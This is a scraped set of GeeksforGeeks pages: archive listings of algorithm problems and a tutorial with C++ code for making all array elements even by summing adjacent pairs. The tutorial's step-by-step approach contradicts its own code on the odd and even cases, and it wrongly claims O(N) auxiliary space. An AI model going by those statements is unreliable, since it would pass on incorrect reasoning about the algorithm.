twoCount occurrences of elements of list in JavaCheck if two strings are permutation of each otherCheck if two strings have a common substringProgram to sort string in descending orderFirst non-repeating character using one traversal of string | Set 2Count common characters in two stringsCount Occurrences of AnagramsFind one extra character in a stringCalculate the frequency of each word in the given stringCount number of triplets with product equal to given number with duplicates allowed | Set-2Count frequencies of all elements in array in Python using collections moduleSorting element of an array by frequency in decreasing orderCount numbers in range such that digits in it and it's product with q are unequalPrinting frequency of each character just after its consecutive occurrencesCheck if given string contains all the digitsPython | Element with largest frequency in listSorting without comparison of elementsFrequency of each character in a String using unordered_map in C++Sort a string according to the frequency of charactersFind minimum difference between any two elements | Set 2Maximum number of characters between any two same character in a stringCheck whether second string can be formed from characters of first stringAlternate Lower Upper String SortMinimum changes to a string to make all substrings distinct Tag Archives: frequency-counting Make all array elements even by replacing any pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to make all array elements even by replacing any pair of array elements… Read More » ArraysMathematicalarray-rearrangefrequency-counting Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Count strings from given array having all characters appearing in a given string Last Updated: 18-12-2020 Given an array of strings arr[][] of size N and a string S, the task is to find the number of strings from the array… Read More » HashStringscpp-unordered_setfrequency-counting Difference between sum of odd and even frequent elements in an Array Last Updated: 17-12-2020 5 Given an array arr[] of integers, the task is to find the absolute difference between the sum of all odd frequent array elements and the… Read More » ArraysHashMathematicalTechnical Scripterfrequency-countingTechnical Scripter 2020 Maximum of even or odd product pairs count from given arrays Last Updated: 18-12-2020 Given two arrays A[] and B[] consisting of N integers, the task is to count pairs (A[i], B[j]) with even and odd product and print… Read More » ArraysGreedyMathematicalfrequency-counting Minimum substring reversals required to make given Binary String alternating Last Updated: 16-12-2020 Given a binary string S of length N, the task is to count the minimum number substrings of S that is required to be reversed… Read More » SearchingStringsbinary-stringfrequency-counting Check if a Binary String can be converted to another by reversing substrings consisting of even number of 1s Last Updated: 17-12-2020 3 Given two binary strings A and B of length N, the task is to check if the string A can be converted to B by… Read More » SearchingStringsbinary-stringfrequency-countingsubstring Count distinct pairs with given sum Last Updated: 15-12-2020 Given an array arr[] of size N and an integer K, the task is to find the count of distinct pairs in the array whose… Read More » ArraysHashMathematicalSearchingfrequency-counting Count pairs with Even Product from two given arrays Last Updated: 15-12-2020 Given two arrays, arr[] and brr[] of size N and M respectively, the task is to find the count of pairs (arr[i], brr[j]) such that… Read More » ArraysGreedyMathematicalSearchingfrequency-counting Non-Repeating Elements of a given array using Multithreaded program Last Updated: 09-12-2020 Given an array arr[] of size N and an integer T representing the count of threads, the task is to find all non-repeating array elements… Read More » ArraysHashTechnical Scriptercpp-mapcpp-multithreadingfrequency-countingProcesses & ThreadsTechnical Scripter 2020 Count Distinct Strings present in an array using Polynomial rolling hash function Last Updated: 18-12-2020 Given an array of strings arr[], the task is to find the count of distinct strings present in the array using polynomial rolling hash function.… Read More » HashMathematicalStringscpp-stringsfrequency-counting Maximize frequency of an element by at most one increment or decrement of all array elements Last Updated: 15-12-2020 Given an array arr[] of size N, the task is to find the maximum frequency of any array element by incrementing or decrementing each array… Read More » ArraysGreedyMathematicalSearchingarray-rearrangefrequency-countingGreedy Algorithms Minimum removals required to make frequency of each array element equal to its value Last Updated: 17-12-2020 Given an array arr[] of size N, the task is to find the minimum count of array elements required to be removed such that frequency… Read More » ArraysGreedyHashMathematicalcpp-mapfrequency-countingGreedy Algorithms Check if given strings can be made same by swapping two characters of same or different strings Last Updated: 14-12-2020 Given an array of equal-length strings, arr[] of size N, the task is to check if all the strings can be made equal by repeatedly… Read More » ArraysHashMathematicalStringsfrequency-counting Page 1 of 3212345...102030...»Last » Most popular in frequency-counting Make all array elements even by replacing any pair of array elements with their sumC program to find the frequency of characters in a stringPrint the frequency of each character in Alphabetical orderMinimum number of distinct elements after removing M items | Set 2Find all missing numbers from a given sorted array Most visited in frequency-counting Count number of equal pairs in a stringSum of maximum of all subarrays by adding even frequent maximum twiceMake all array elements even by replacing adjacent pair of array elements with their sumMinimum deletions from string to reduce it to string with at most 2 unique charactersLargest Sum Contiguous Subarray having unique elements room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Make all array elements even by replacing adjacent pair of array elements with their sum - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Arrays in JavaWrite a program to reverse an array or stringProgram for array rotationLargest Sum Contiguous SubarrayStack Data Structure (Introduction and Program)Find the smallest and second smallest elements in an arrayArrays in C/C++Sort elements by frequency | Set 1Write a program to reverse an array or stringSubset Sum Problem | DP-25K'th Smallest/Largest Element in Unsorted Array | Set 1Given an array A[] and a number x, check for pair in A[] with sum as xSearch an element in a sorted and rotated arrayCount Inversions in an array | Set 1 (Using Merge Sort)Linear SearchFind subarray with given sum | Set 1 (Nonnegative Numbers)Find the Missing NumberPrint a given matrix in spiral formSliding Window Maximum (Maximum of all subarrays of size k)Linked List vs ArrayQueue | Set 1 (Introduction and Array Implementation)Next Greater ElementStock Buy Sell to Maximize ProfitArray of Strings in C++ (5 Different Ways to Create)Trapping Rain WaterMultidimensional Arrays in JavaSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython | Using 2D arrays/lists the right wayUgly Numbers Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their sum. Examples: Input: arr[] = { 2, 4, 5, 11, 6 }Output: 1Explanation:Replacing a pair (arr[2], arr[3]) with their sum ( = 5 + 11 = 16) modifies arr[] to { 2, 4, 16, 16, 6 } Since all array elements are even, the required output is 1. Input: arr[] = { 1, 2, 4, 3, 11 } Output: 3Explanation: Replacing the pair (arr[3], arr[4]) and replacing them with their sum ( = 3 + 11 = 14) modifies arr[] to { 1, 2, 4, 14, 14 }Replacing the pair (arr[0], arr[1]) and replacing them with their sum ( = 1 + 2 = 3) modifies arr[] to { 3, 3, 4, 14, 14 } Replacing the pair (arr[0], arr[1]) with their sum ( = 3 + 3 = 6) modifies arr[] to { 6, 6, 4, 14, 14 }. Therefore, the required output is 3. Approach: The idea is to use the fact that the sum of two odd numbers generates an even number. Follow the steps below to solve the problem: Initialize two integers, say res, to count the number of replacements, and odd_continuous_segment, to count the number of continuous odd numbers Traverse the array and check the following conditions for every array element: If arr[i] is odd, then increment the count of odd_continuous_segment by 1 Otherwise, if odd_continuous_segment is odd, then increment res by odd_continuous_segment/2. Otherwise, increment res by odd_continuous_segment / 2 + 2 and assign odd_continuous_segment to 0. Check if odd_continuous_segment is odd. If found to be true, then increment res by odd_continuous_segment / 2. Otherwise increment res by (odd_continuous_segment / 2 + 2) Finally, print the obtained value of res Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to implement // the above approach #include <iostream> using namespace std; // Function to find minimum count of operations // required to make all array elements even int make_array_element_even(int arr[], int N) { // Stores minimum count of replacements // to make all array elements even int res = 0; // Stores the count of odd // continuous numbers int odd_cont_seg = 0; // Traverse the array for (int i = 0; i < N; i++) { // If arr[i] is an odd number if (arr[i] % 2 == 1) { // Update odd_cont_seg odd_cont_seg++; } else { if (odd_cont_seg > 0) { // If odd_cont_seg is even if (odd_cont_seg % 2 == 0) { // Update res res += odd_cont_seg / 2; } else { // Update res res += (odd_cont_seg / 2) + 2; } // Reset odd_cont_seg = 0 odd_cont_seg = 0; } } } // If odd_cont_seg exceeds 0 if (odd_cont_seg > 0) { // If odd_cont_seg is even if (odd_cont_seg % 2 == 0) { // Update res res += odd_cont_seg / 2; } else { // Update res res += odd_cont_seg / 2 + 2; } } // Print the result return res; } // Drivers Code int main() { int arr[] = { 2, 4, 5, 11, 6 }; int N = sizeof(arr) / sizeof(arr[0]); cout << make_array_element_even(arr, N); return 0; } chevron_right filter_none Output: 1 Time complexity: O(N)Auxiliary space: O(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Make all array elements even by replacing any pair of array elements with their sumMinimize array length by repeatedly replacing pairs of unequal adjacent array elements by their sumMaximize array sum by replacing equal adjacent pairs by their sum and X respectivelyMaximize modulus by replacing adjacent pairs with their modulus for any permutation of given ArraySmallest array that can be obtained by replacing adjacent pairs with their productsReduce array to a single element by repeatedly replacing adjacent unequal pairs with their maximumMaximum sum of Array formed by replacing each element with sum of adjacent elementsReplace the odd positioned elements with their cubes and even positioned elements with their squaresMaximize sum of squares of array elements possible by replacing pairs with their Bitwise AND and Bitwise ORMinimize array sum by replacing greater and smaller elements of pairs by half and double of their values respectively atmost K timesMinimize cost to reduce array to a single element by replacing K consecutive elements by their sumMaximize count of equal numbers in Array of numbers upto N by replacing pairs with their sumMinimize remaining array element by repeatedly replacing pairs by half of one more than their sumArray value by repeatedly replacing max 2 elements with their absolute differenceLast element remaining by deleting two largest elements and replacing by their absolute difference if they are unequalMaximize count of distinct strings generated by replacing similar adjacent digits having sum K with KModify sequence of first N natural numbers to a given array by replacing pairs with their GCDMinimize remaining array element by removing pairs and replacing them by their absolute differenceCount of pairs in a given range with sum of their product and sum equal to their concatenated numberFind all matrix elements which are minimum in their row and maximum in their columnnk14646Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Practice Tags : ArraysSearchingMathematical thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Check if a string can be converted to another given string by removal of a substring Next last_page Make all array elements even by replacing any pair of array elements with their sum Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Arrays Maximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayRemove duplicates from sorted arrayFind Second largest element in an arrayFind duplicates in O(n) time and O(1) extra space | Set 1 Most visited in Mathematical Program for Fibonacci numbersC++ Data TypesProgram for factorial of a numberSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given string room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Searching Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Binary SearchFind the smallest and second smallest elements in an arrayK'th Smallest/Largest Element in Unsorted Array | Set 1Search an element in a sorted and rotated arrayLinear SearchFind the Missing Numberk largest(or smallest) elements in an array | added Min Heap methodMaximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayK'th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time)Median of two sorted arrays of same sizeGiven an array of size n and a number k, find all elements that appear more than n/k timesSearch in a row wise and column wise sorted matrixK'th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time)Find next greater number with same set of digitsCount number of occurrences (or frequency) in a sorted arrayFind the repeating and the missing | Added 3 new methodsFind all triplets with zero sumJump SearchFind the smallest and second smallest elements in an arrayFind the minimum element in a sorted and rotated arrayGiven a sorted and rotated array, find if there is a pair with a given sumTwo elements whose sum is closest to zeroInterpolation SearchFind a peak elementTwo Pointers TechniqueFind the index of an array element in JavaMedian of two sorted arrays of different sizesFind whether an array is subset of another array | Added Method 5Most frequent element in an array Category Archives: Searching Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to… Read More » SearchingStringsprefixsubstringSuffix Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Count pairs of indices having equal prefix and suffix sums Last Updated: 20-12-2020 Given an array arr[] of length N, the task is to find the count of pairs of indices (i, j) (0-based indexing) such that prefix… Read More » ArraysHashMathematicalSearchingprefix-sumsubarraysubarray-sumsuffix-sum Minimum number of coins to be collected per hour to empty N piles in at most H hours Last Updated: 21-12-2020 Given an array arr[] consiting of N integers representing the number of coins in each pile, and an integer H, the task is to find… Read More » ArraysDivide and ConquerMathematicalSearchingBinary Search Queries to count Composite Magic Numbers from a given range [L, R] Last Updated: 21-12-2020 Given two arrays L[] and R[] of sizes Q, the task is to find the number of composite magic numbers i.e numbers which are both… Read More » MathematicalSearchingarray-range-queriesNumbersPrime Number Smallest positive integer that divides all array elements to generate quotients with sum not exceeding K Last Updated: 21-12-2020 Given an array arr[] of size N and a positive integer K, the task is to find the smallest positive integer such that the sum… Read More » ArraysMathematicalPlacementsSearchingBinary Searchinterview-preparation Minimum Deci-Binary numbers required to obtain a given sum S Last Updated: 18-12-2020 Given a numeric string S representing a positive decimal integer, the task is to find the minimum number of positive Deci-Binary numbers required to obtain… Read More » GreedyMathematicalPattern SearchingSearchingbinary-representationnumber-digits Print all root to leaf paths of an N-ary tree Last Updated: 16-12-2020 Given an N-Ary tree, the task is to print all root to leaf paths of the given N-ary Tree. Examples: Input: … Read More » BacktrackingRecursionSearchingTreeDFSn-ary-treeTree Traversals Make all the elements of array odd by incrementing odd-indexed elements of odd-length subarrays Last Updated: 17-12-2020 3 Given an array arr[] of size N, the task is to make all the array elements odd by choosing an odd length subarray of arr[]… Read More » ArraysMathematicalSearchingTechnical Scriptersubarray Lexicographically largest string possible by reversing substrings having even number of 1s Last Updated: 17-12-2020 2 Given a binary string S, the task is to convert the given string S to its lexicographic maximum form by reversing substrings having an even… Read More » SearchingSortingStringslexicographic-orderingstringssubstring Minimum substring reversals required to make given Binary String alternating Last Updated: 16-12-2020 Given a binary string S of length N, the task is to count the minimum number substrings of S that is required to be reversed… Read More » SearchingStringsbinary-stringfrequency-counting Check if a Binary String can be converted to another by reversing substrings consisting of even number of 1s Last Updated: 17-12-2020 3 Given two binary strings A and B of length N, the task is to check if the string A can be converted to B by… Read More » SearchingStringsbinary-stringfrequency-countingsubstring Minimum removals to make a string concatenation of a substring of 0s followed by a substring of 1s Last Updated: 18-12-2020 Given binary string str of length N​​​​, the task is to find the minimum number of characters required to be deleted from the given binary… Read More » MathematicalSearchingStringsTechnical Scripterbinary-stringTechnical Scripter 2020 Count maximum possible pairs from an array having sum K Last Updated: 18-12-2020 Given an array arr[] consisting of N integers and an integer K, the task is to find the maximum number of pairs having sum K… Read More » ArraysHashSearchingSortingHashTabletwo-pointer-algorithm Page 1 of 7212345...102030...»Last » Most popular in Searching Complexity Analysis of Binary SearchLinear Search vs Binary SearchSearch, insert and delete in an unsorted arrayBest First Search (Informed Search)Program to remove vowels from a String Most Visited in Searching 3 Different ways to print Fibonacci series in JavaDuplicates in an array in O(n) time and by using O(1) extra space | Set-3Sort an array according to the order defined by another arrayBinary Search on Singly Linked ListRecursive program to linearly search an element in a given array room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

subarray Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Largest Sum Contiguous SubarrayFind subarray with given sum | Set 1 (Nonnegative Numbers)Find subarray with given sum | Set 2 (Handles Negative Numbers)Maximum Subarray Sum using Divide and Conquer algorithmNumber of subarrays having sum exactly equal to kFind the length of largest subarray with 0 sumSmallest subarray with sum greater than a given valuePrint all subarrays with 0 sumFind if there is a subarray with 0 sumMaximum circular subarray sumSplit an array into two equal Sum subarraysSum of all Subarrays | Set 1Generating subarrays using recursionFind maximum (or minimum) sum of a subarray of size kSliding Window Maximum (Maximum of all subarrays of size k) using stack in O(n) timeK-th Largest Sum Contiguous SubarrayCount all sub-arrays having sum divisible by kCount pairs in array whose sum is divisible by KNumber of subarrays having product less than KSum of minimum and maximum elements of all subarrays of size k.Maximum Product Subarray | Set 3Size of The Subarray With Maximum SumProduct of all Subarrays of an ArraySplit the given array into K sub-arrays such that maximum sum of all sub arrays is minimumLongest subarray with sum divisible by kNumber of subarrays having sum less than KSmallest sum contiguous subarrayCheck whether an Array is Subarray of another ArrayFind subarray with given sum with negatives allowed in constant spaceLargest sum subarray with at-least k numbers Tag Archives: subarray Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of… Read More » ArraysMathematicalSortingarray-rearrangesubarray Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Count pairs of indices having equal prefix and suffix sums Last Updated: 20-12-2020 Given an array arr[] of length N, the task is to find the count of pairs of indices (i, j) (0-based indexing) such that prefix… Read More » ArraysHashMathematicalSearchingprefix-sumsubarraysubarray-sumsuffix-sum Count pairs (i, j) from given array such that i K * arr[j] Last Updated: 18-12-2020 Given an array arr[] of length N and an integer K, the task is to count the number of pairs (i, j) such that i… Read More » ArraysDivide and ConquerMathematicalSortingMerge Sortpartitionsubarray Make all the elements of array odd by incrementing odd-indexed elements of odd-length subarrays Last Updated: 17-12-2020 3 Given an array arr[] of size N, the task is to make all the array elements odd by choosing an odd length subarray of arr[]… Read More » ArraysMathematicalSearchingTechnical Scriptersubarray Count N-length arrays made from first M natural numbers whose subarrays can be made palindromic by replacing less than half of its elements Last Updated: 17-12-2020 Given two integer N and M, the task is to find the count of arrays of size N with elements from the range [1, M]… Read More » ArraysCombinatorialMathematicalpalindromepermutationsubarray Smallest element present in every subarray of all possible lengths Last Updated: 15-12-2020 Given an array arr[] of length N, the task for every possible length of subarray is to find the smallest element present in every subarray… Read More » ArraysMathematicalSearchingTechnical Scriptercpp-mapcpp-setsubarrayTechnical Scripter 2020 Queries to replace subarrays by equal length arrays with at most P replacements allowed for any array element Last Updated: 15-12-2020 2 Given an array, arr[] of size N, an integer P and a 2D array Q[][] consisting of queries of the following type: 1 L R… Read More » Arraysarray-range-queriesarray-rearrangedisjoint-setsubarrayunion-find Length of the longest subarray whose Bitwise XOR is K Last Updated: 11-12-2020 Given an array arr[] of size N and an integer K, the task is to find the length of the longest subarray having Bitwise XOR… Read More » ArraysBit MagicHashMathematicalBitwise-XORcpp-mapHashprefixsubarray Largest element in the longest Subarray consisting of only Even or only Odd numbers Last Updated: 10-12-2020 Given an array arr[] of size N, the task is to find the largest element in the longest subarray consisting only of even numbers or… Read More » ArraysMathematicalSearchingSortingsubarray Maximum length of same indexed subarrays from two given arrays satisfying the given condition Last Updated: 16-12-2020 Given two arrays arr[] and brr[] and an integer C, the task is to find the maximum possible length, say K, of same indexed subarrays… Read More » Advanced Data StructureArraysMathematicalQueueSearchingTreeBinary Searchcpp-dequeSegment-Treesliding-windowsubarraysubarray-sum Generate an array with product of all subarrays of length exceeding one divisible by K Last Updated: 14-12-2020 Given two positive integers N and K, the task is to generate an array of length N such that the product of every subarray of… Read More » ArraysGreedyMathematicaldivisibilitysubarray Check if equal sum components can be obtained from given Graph by removing edges from a Cycle Last Updated: 08-12-2020 Given an undirected graph with N vertices and N edges that contain only one cycle, and an array arr[] of size N, where arr[i] denotes… Read More » ArraysGraphRecursionTechnical ScripterDFSgraph-cyclesubarrayTechnical Scripter 2020 Count ways to split array into two equal sum subarrays by changing sign of any one array element Last Updated: 08-12-2020 Given an array arr[] consisting of N integers, the task is to count ways to split array into two subarrays of equal sum by changing… Read More » ArraysGreedyMathematicalSearchingfrequency-countingpartitionprefixprefix-sumsubarraySuffixsuffix-sum Page 1 of 2812345...1020...»Last » Most popular in subarray XOR of all subarray XORs | Set 1Minimum number of operations to convert array A to array B by adding an integer into a subarrayLongest Subarray having sum of elements atmost 'k'Count pairs of indices having equal prefix and suffix sumsSum of maximum of all subarrays by adding even frequent maximum twice Most visited in subarray Split array in three equal sum subarraysLongest subarray with difference exactly K between any two distinct valuesMaximum sum subarray having sum less than or equal to given sumLongest subarray in which absolute difference between any two element is not greater than XFind if array can be divided into two subarrays of equal sum room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Check if a string can be converted to another given string by removal of a substring - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus 